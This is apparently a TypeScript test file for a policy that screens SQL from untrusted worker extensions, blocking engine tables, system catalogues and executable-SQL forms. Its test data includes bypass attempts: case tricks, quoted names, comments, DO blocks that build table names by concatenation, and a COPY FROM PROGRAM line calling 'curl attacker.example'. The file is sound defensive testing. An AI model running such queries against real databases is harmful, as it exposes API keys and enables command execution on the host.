/**
 * Worker→host SQL bridge table policy.
 *
 * `enforcePublisherTier` routes community (untrusted) extensions into a worker
 * because the worker is meant to be the trust boundary. The bridge previously
 * ran their SQL with pool.unsafe() and no restriction at all, so these cases
 * pin the rule that now applies — including the case-folding and
 * schema-qualification tricks that get used to walk past a name check.
 */

import { describe, expect, it } from 'bun:test';
import {
  assertWorkerSqlAllowed,
  ownedPrefixFor,
  WorkerSqlPolicyError,
} from '../../lib/extensions/worker-sql-policy.js';

const EXT = 'ai';

function allowed(sql: string): boolean {
  try {
    assertWorkerSqlAllowed(EXT, sql);
    return true;
  } catch (e) {
    if (e instanceof WorkerSqlPolicyError) return false;
    throw e;
  }
}

describe('ownedPrefixFor', () => {
  it('matches the inline proxy convention', () => {
    expect(ownedPrefixFor('ai')).toBe('zv_ai_');
    expect(ownedPrefixFor('compliance/ro/saft')).toBe('zv_compliance_ro_saft_');
  });
});

describe('assertWorkerSqlAllowed — engine tables', () => {
  const blocked = [
    'SELECT * FROM zv_api_keys',
    'SELECT * FROM zv_tenants',
    'SELECT * FROM zvd_orders JOIN zv_api_keys ON true',
    'UPDATE zv_settings SET value = $1',
    'DELETE FROM zvd_orders WHERE id IN (SELECT id FROM zv_tenant_users)',
    'INSERT INTO zv_scim_tokens (name) VALUES ($1)',
  ];
  for (const sql of blocked) {
    it(`blocks: ${sql.slice(0, 46)}`, () => {
      expect(allowed(sql)).toBe(false);
    });
  }

  it('blocks regardless of case', () => {
    expect(allowed('SELECT * FROM ZV_API_KEYS')).toBe(false);
    expect(allowed('SELECT * FROM Zv_Api_Keys')).toBe(false);
  });

  it('blocks a schema-qualified reference', () => {
    expect(allowed('SELECT * FROM public.zv_api_keys')).toBe(false);
  });

  it('blocks a quoted identifier', () => {
    expect(allowed('SELECT * FROM "zv_api_keys"')).toBe(false);
    expect(allowed('SELECT * FROM public."ZV_API_KEYS"')).toBe(false);
  });

  it('names every offending table in the error', () => {
    try {
      assertWorkerSqlAllowed(EXT, 'SELECT * FROM zv_tenants, zv_api_keys');
      throw new Error('should have thrown');
    } catch (e) {
      expect((e as Error).message).toContain('zv_api_keys');
      expect((e as Error).message).toContain('zv_tenants');
    }
  });
});

describe('assertWorkerSqlAllowed — what stays permitted', () => {
  const permitted = [
    'SELECT * FROM zvd_orders',
    'SELECT * FROM zvd_orders WHERE total > $1',
    'INSERT INTO zvd_invoices (id) VALUES ($1)',
    'SELECT * FROM zv_ai_providers',
    'UPDATE zv_ai_chats SET title = $1 WHERE id = $2',
    'SELECT a.* FROM zvd_orders a JOIN zv_ai_providers b ON a.p = b.id',
  ];
  for (const sql of permitted) {
    it(`allows: ${sql.slice(0, 46)}`, () => {
      expect(allowed(sql)).toBe(true);
    });
  }

  it('does not confuse zvd_ with zv_', () => {
    // 'zvd_x' must not be read as an engine table — the third char is 'd'.
    expect(allowed('SELECT * FROM zvd_zv_weird')).toBe(true);
  });

  // ── Words after FROM and JOIN that are not tables ────────────────────────
  //
  // Found by running this policy over every raw statement the first-party
  // extensions actually ship: it refused `lateral`, `now`, `date`,
  // `start_date` and `invoice_date`, none of which is a table. A gate that
  // names a table nobody wrote is a gate whose next report is not believed.

  it('reads JOIN LATERAL as a subquery, not a table called lateral', () => {
    // `hr/employees` ships exactly this shape.
    expect(allowed('SELECT e.id FROM zvd_employees e LEFT JOIN LATERAL (SELECT 1) x ON true')).toBe(
      true,
    );
  });

  it('also handles LATERAL over a set-returning function', () => {
    // The form with no parenthesis directly after the keyword. Written after a
    // first attempt to prove the LATERAL rule failed to discriminate: with the
    // subquery form alone, the function-call rule below already covered it, so
    // the rule looked necessary while doing nothing.
    expect(allowed('SELECT * FROM zvd_orders o JOIN LATERAL generate_series(1, 3) g ON true')).toBe(
      true,
    );
  });

  it('does not read a function call after FROM as a table', () => {
    expect(allowed('SELECT * FROM zvd_orders WHERE created_at > now()')).toBe(true);
    expect(allowed('SELECT EXTRACT(YEAR FROM now()) FROM zvd_orders')).toBe(true);
  });

  it("does not read EXTRACT's keyword argument as a table", () => {
    // `EXTRACT(EPOCH FROM start_date)` — the word after FROM is a column.
    expect(allowed('SELECT EXTRACT(EPOCH FROM start_date) FROM zvd_leave')).toBe(true);
    expect(allowed("SELECT TRIM(BOTH ' ' FROM name) FROM zvd_contacts")).toBe(true);
    expect(allowed('SELECT SUBSTRING(code FROM 2) FROM zvd_items')).toBe(true);
  });

  it('still refuses an engine table inside such a statement', () => {
    // The relaxations above must not become a hiding place: a real table
    // reference elsewhere in the same statement is still read.
    expect(
      allowed(
        'SELECT EXTRACT(EPOCH FROM start_date) FROM "session" JOIN LATERAL (SELECT 1) x ON true',
      ),
    ).toBe(false);
    expect(allowed('SELECT * FROM zvd_orders WHERE id IN (SELECT id FROM "user")')).toBe(false);
  });
});

describe('assertWorkerSqlAllowed — hiding places', () => {
  it('ignores a table name that only appears inside a string literal', () => {
    expect(allowed("SELECT * FROM zvd_logs WHERE msg = 'read zv_api_keys please'")).toBe(true);
  });

  it('still catches the real reference when a decoy string is present', () => {
    expect(allowed("SELECT * FROM zv_api_keys WHERE note = 'zvd_orders'")).toBe(false);
  });

  it('does not let a line comment conceal a reference', () => {
    // The comment is blanked, so the only live reference is the permitted one.
    expect(allowed('SELECT * FROM zvd_orders -- zv_api_keys')).toBe(true);
    expect(allowed('SELECT * FROM zv_api_keys -- zvd_orders')).toBe(false);
  });

  it('handles block comments and dollar-quoted bodies', () => {
    expect(allowed('SELECT * FROM zvd_orders /* zv_api_keys */')).toBe(true);
    expect(allowed('SELECT $tag$ zv_api_keys $tag$, x FROM zvd_orders')).toBe(true);
  });

  it('handles escaped quotes without losing track of the string', () => {
    expect(allowed("SELECT * FROM zvd_orders WHERE a = 'it''s zv_api_keys'")).toBe(true);
  });
});

describe('assertWorkerSqlAllowed — bodies that execute as code', () => {
  // Blanking dollar-quoted blocks keeps a table name *mentioned* in a string
  // from being read as a reference. It also emptied the one place where a
  // reference is most dangerous: the body of a DO block, which Postgres runs as
  // the database owner. Nothing was left for the scan to find.
  it('refuses a DO block that hides an engine table in its body', () => {
    expect(allowed('DO $$ BEGIN PERFORM * FROM zv_api_keys; END $$')).toBe(false);
    expect(allowed("DO $$ BEGIN EXECUTE 'SELECT k FROM zv_api_keys'; END $$")).toBe(false);
  });

  it('refuses a DO block even when the body names nothing at all', () => {
    // The point is not what this body says — it is that a body can build its
    // SQL by concatenation, so no text scan can clear one.
    expect(allowed("DO $$ BEGIN EXECUTE 'SELECT 1 FROM zv_' || 'api_keys'; END $$")).toBe(false);
  });

  it('refuses it however the block is dressed up', () => {
    expect(allowed('  \n do $tag$ BEGIN END $tag$')).toBe(false);
    expect(allowed('/* harmless */ DO $$ BEGIN END $$')).toBe(false);
    expect(allowed('DO LANGUAGE plpgsql $$ BEGIN END $$')).toBe(false);
  });

  it('refuses the other ways a string becomes executable SQL', () => {
    expect(allowed('CALL some_procedure()')).toBe(false);
    expect(allowed('CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql')).toBe(false);
    expect(allowed('CREATE OR REPLACE PROCEDURE p() AS $$ BEGIN END $$ LANGUAGE plpgsql')).toBe(
      false,
    );
    expect(allowed('PREPARE s AS SELECT 1')).toBe(false);
    expect(allowed('EXECUTE s')).toBe(false);
    expect(allowed("COPY zvd_orders FROM PROGRAM 'curl attacker.example'")).toBe(false);
  });

  it('does not fire on ordinary SQL that merely contains the words', () => {
    // A gate that rejects `ON CONFLICT DO NOTHING` would be turned off.
    expect(allowed('INSERT INTO zvd_orders (id) VALUES ($1) ON CONFLICT DO NOTHING')).toBe(true);
    expect(
      allowed('INSERT INTO zvd_orders (id) VALUES ($1) ON CONFLICT (id) DO UPDATE SET id = $1'),
    ).toBe(true);
    expect(allowed("SELECT * FROM zvd_logs WHERE msg = 'call me' OR msg = 'do it'")).toBe(true);
    expect(allowed('SELECT * FROM zvd_orders WHERE note = $$ do $$')).toBe(true);
  });

  it('still allows a dollar-quoted string constant', () => {
    // The behaviour the blanking exists for, kept intact.
    expect(allowed('SELECT $tag$ zv_api_keys $tag$, x FROM zvd_orders')).toBe(true);
  });
});

/**
 * The catalogue is reconnaissance, not data.
 *
 * `information_schema.tables` and `pg_catalog.pg_authid` disclose every table
 * name, column and role on the instance. A schema-qualified reference is
 * therefore refused on the schema alone — before any of the table-name rules
 * below it get a say, because a table name is not what makes those dangerous.
 *
 * This is the worker bridge's half of the same allowlist that `ctx.db` enforces
 * in-process. Both were prefix denylists once, and both missed the unprefixed
 * Better-Auth tables for the same reason.
 */
describe('assertWorkerSqlAllowed — schema-qualified references', () => {
  it('refuses the system catalogues by schema, whatever the table is called', () => {
    for (const q of [
      'SELECT * FROM information_schema.tables',
      'SELECT * FROM pg_catalog.pg_authid',
      'SELECT rolname FROM pg_catalog.pg_roles',
    ]) {
      expect(() => assertWorkerSqlAllowed('finance/banking', q)).toThrow(WorkerSqlPolicyError);
    }
  });

  it('names what it refused, so the author can see which reference was the problem', () => {
    expect(() =>
      assertWorkerSqlAllowed('finance/banking', 'SELECT * FROM information_schema.columns'),
    ).toThrow(/information_schema\.columns/);
  });

  it('allows an explicit public-schema reference to a table the extension may read', () => {
    // `public` is where everything the extension owns lives, so qualifying with it
    // must not itself be an offence — only another schema is.
    expect(() =>
      assertWorkerSqlAllowed('finance/banking', 'SELECT * FROM public.zvd_invoices'),
    ).not.toThrow();
  });
});
